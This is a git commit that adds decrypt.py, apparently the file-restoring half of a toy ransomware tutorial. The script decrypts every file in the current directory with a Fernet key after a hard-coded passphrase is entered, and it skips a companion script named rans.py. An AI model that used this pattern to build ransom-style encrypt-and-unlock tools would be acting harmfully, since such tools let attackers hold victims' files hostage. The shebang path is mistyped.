076c3be6fcdc6272817073231f16811fbd5ded01
iCyberia <111239491+iCyberia@users.noreply.github.com>
2023-09-22 11:24:41 -0400

    Basic Fernet encrypt and decrypt
    #NetworkChuck

---
+++ decrypt.py
@@ -0,0 +1,27 @@
+#!/user/bin/env python3
+import os
+from cryptography.fernet import Fernet
+
+files = []
+for file in os.listdir():
+	if file == "rans.py" or file == "thekey.key" or file == "decrypt.py":
+		continue
+	if os.path.isfile(file):
+		files.append(file)
+
+with open("thekey.key", "rb") as key:
+	secretkey = key.read()
+
+secretphrase = "Decrypt"
+user_phrase = input("Enter phrase to decrypt\n")
+
+if user_phrase == secretphrase:
+	for file in files:
+		with open(file, "rb") as thefile:
+			contents = thefile.read()
+		contents_decrypted = Fernet(secretkey).decrypt(contents)
+		with open(file, "wb") as thefile:
+			thefile.write(contents_decrypted)
+		print("Decrypted")
+else:
+	print("Wrong phrase")
